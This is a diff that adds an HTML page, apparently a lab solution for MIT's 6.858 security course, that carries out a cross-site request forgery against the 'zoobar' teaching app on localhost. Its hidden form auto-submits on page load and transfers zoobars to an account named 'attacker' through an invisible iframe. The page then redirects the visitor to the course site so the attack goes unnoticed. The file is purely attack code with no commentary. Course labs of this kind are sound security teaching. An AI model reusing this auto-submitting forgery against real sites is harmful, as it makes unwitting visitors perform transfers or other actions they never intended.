@@ -1,0 +1,12 @@
+<html>
+	<body>
+		<form name="csrfform" action="http://localhost:8080/zoobar/index.cgi/transfer" method="POST" target="csrf-frame">
+			<input name="zoobars" value="10"/>
+			<input name="recipient" value="attacker"/>
+		</form>
+		<iframe style="display:none" id="csrf-frame" name="csrf-frame" onload="window.location.href='http://css.csail.mit.edu/6.858/2014/'"></iframe>
+    <script> 
+        document.forms[0].submit();
+    </script>
+	</body>
+</html>
